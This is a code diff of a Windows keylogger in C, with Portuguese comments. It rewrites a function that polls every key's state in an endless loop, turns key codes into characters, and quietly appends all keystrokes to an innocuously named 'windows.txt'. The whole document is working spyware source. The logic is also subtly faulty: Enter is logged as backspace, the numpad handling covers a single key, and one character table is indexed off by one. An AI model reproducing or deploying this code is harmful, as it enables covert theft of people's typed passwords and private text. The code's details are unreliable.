@@ -1,100 +1,108 @@
+#include <windows.h>
+#include <stdio.h>
 
-// Talvez eu tenha upado o arquivo errado e parou de funcionar kkkk
+FILE* kh;
 
-DWORD WINAPI logg(){
-    int vkey, last_key_state[0xff];
-    int isCAPSLOCK,IsNUNLOCK;
-    int isL_SHIFT,IsR_SHIFT;
-    int isPressed;
-    char showKey;
-    char NUNCHAR[]=")!@#$%^&*+(";
-    char chars_vn[]="=,~./`";
-    char chars_vs[]=":<>_?=";
-    char chars_vo[]="[\\]\';";
-    char chars_vb[]="{|}\"";
-    FILE *kh;
-    char KEY_LOG_FILE[]="windows.txt";
-    //fazendo a last kay state 0
-    for(vkey=0;vkey<0xFF;vkey++){
-        last_key_state[vkey]=0;
-    }
+void end(void) {
+    fclose(kh);
+}
 
-    //rodando infinitamente
-    while(1){
-        Sleep(10);
+DWORD WINAPI logg(_In_ LPVOID lpParameter) {
+    SHORT last_key_state[0xff] = { 0 };
+    SHORT is_capslock   = 0, is_numlock = 0;
+    SHORT is_shift      = 0;
+    SHORT is_pressed    = 0;
+    unsigned char show_key  = 0;
+    unsigned char vkey      = 0;
+    
+    const char* num_char = ")!@#$%^&*+(";
+    const char* chars_vn = "=,~./`";
+    const char* chars_vs = ":<>_?=";
+    const char* chars_vo = "[\\]\';";
+    const char* chars_vb = "{|}\"";
 
-        isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
-        IsNUNLOCK=(GetKeyState(0x90)&0xFF)>0?:0;
-        isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
-        IsR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;
+    fopen_s(&kh, "windows.txt", "a");
+    
+    if(kh != 0){ // se o arquivo foi aberto com sucesso
+        atexit(end);
 
-        for(vkey=0;vkey=0xFF;vkey++){
-            isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
-            showKey=(char)vkey;
-            if(isPressed==1 && last_key_state[vkey] ==0){
-                // alfabeto
-                if(vkey>=0x41 && vkey <=0x5A){
-                    if(isCAPSLOCK==0){
-                        if(isL_SHIFT==0 && IsR_SHIFT==0){
-                            showKey=(char)(vkey==0x20);
+        //rodando infinitamente
+        while (1) { 
+            Sleep(10);
+
+            if (GetAsyncKeyState(0x90) & 0x0001)    // NUMLOCK é de alternância, estar pressionado != ativo
+                is_numlock = !is_numlock;           // alterna entre TRUE e FALSE
+
+            if (GetAsyncKeyState(0x14) & 0x0001)    // Mesma razão de cima
+                is_capslock = !is_capslock;
+
+            for (vkey = 0x0D; vkey <= 0xDF; vkey++) {
+                if (!(vkey == 0x20 || (vkey >= 0x30 && vkey <= 0x39) || (vkey >= 0x41 && vkey <= 0x5A) || (vkey >= 0x60 && vkey <= 0x60) ||
+                    (vkey >= 0x6A && vkey <= 0x6F) || (vkey >= 0xBA && vkey <= 0xC0) || (vkey > 0xDB && vkey <= 0xDF) || vkey == 0x0D))
+                    continue; // evita chamadas desnecessárias ao GetAsyncKeyState, diminuindo a usagem de CPU
+
+                show_key = vkey;
+                is_pressed = GetAsyncKeyState(vkey);
+
+                if (is_pressed && !last_key_state[vkey]) {
+                    is_shift = GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1);
+
+                    // alfabeto
+                    if (vkey >= 0x41 && vkey <= 0x5A)
+                        if (!is_capslock == !is_shift)
+                            show_key = vkey + 0x20;
+
+                    //para num, chars
+                    else if (vkey >= 0x30 && vkey <= 0x39)
+                        if (is_shift)
+                            show_key = num_char[vkey - 0x30];
+
+                    //NUMPAD
+                    else if (vkey >= 0x60 && vkey <= 0x60) {
+                            if (!is_numlock)
+                                show_key = 0x00;
+
+                            else show_key = vkey - 0x30;
+                    }
+
+                    else if (vkey >= 0x6A && vkey <= 0x6F)
+                            show_key = vkey - 0x40;
+
+                    //OEM chars
+                    else if (vkey >= 0xBA && vkey <= 0xC0) {
+                        if (is_shift) {
+                            show_key = chars_vs[vkey - 0xBA];
+                        }
+                        else {
+                            show_key = chars_vn[vkey - 0xBA];
                         }
                     }
-                    else if(isL_SHIFT==1 || IsR_SHIFT==1){
-                        showKey=(char)(vkey=0x20);
+
+                    //OEM chars 2
+                    else if (vkey > 0xDB && vkey <= 0xDF) {
+                        if (is_shift) {
+                            show_key = chars_vb[vkey - 0xDB];
+                        }
+                        else {
+                            show_key = chars_vo[vkey - 0xDB];
+                        }
                     }
-                }
-                //para num, chars
-                else if(vkey>=0x30 && vkey<=0x30){
-                    if(isL_SHIFT==1 || IsR_SHIFT==1){
-                        showKey=NUNCHAR[vkey-0x30];
+
+                    //backspace
+                    else if (vkey == 0x0D) {
+                        fputs("<BACKSPACE>", kh);
+                        show_key = 0x00;
                     }
-                }
-                //pra um lado
-                else if (vkey>=0x60 && vkey<0x60 && IsNUNLOCK==1){
-                    showKey=(char)(vkey-0x30);
-                }
-                //pro outro lado kkkk
-                else if (vkey>=0x60 && vkey<=0x60 && IsNUNLOCK==1){
-                    showKey=(char)(vkey-0x30);
-                }
-                //pra p
-                else if(vkey>=0xBA && vkey<=0xC0){
-                    if (isL_SHIFT ==1 || IsR_SHIFT==1){
-                        showKey=chars_vs[vkey-0xBA];
-                    }
-                    else{
-                            showKey=chars_vn[vkey-0xBA];
-                    }
-                }
-                else if(vkey>-0xD8 && vkey<=0xDF){
-                    if(isL_SHIFT==1 || IsR_SHIFT==1){
-                        showKey=chars_vb[vkey-0xD8];
-                    }
-                    else{
-                        showKey=chars_vo[vkey-0XD8];
-                    }
-                }
-                //aaa
-                else if(vkey==0x0D){
-                    showKey=(char)0x6A;
-                }
-                else if(vkey>=0x6A && vkey<=0x6F){
-                    showKey=(char)(vkey-0x4D);
-                }
-                else if(vkey!=0x20 && vkey!=0x09){
-                    showKey=(char)0x60;
+
+                    if(show_key)
+                        fputc(show_key, kh);
                 }
 
-                if(showKey!=(char)0x00){
-                    kh=fopen(KEY_LOG_FILE,"a");
-                    putc(showKey,kh);
-                    fclose(kh);
-                }
-
+                //salva o ultimo state da key
+                last_key_state[vkey] = is_pressed;
             }
-            //salva o ultimo state da key
-            last_key_state[vkey]=isPressed;
-
         }
     }
+    
+    return 0;
 }
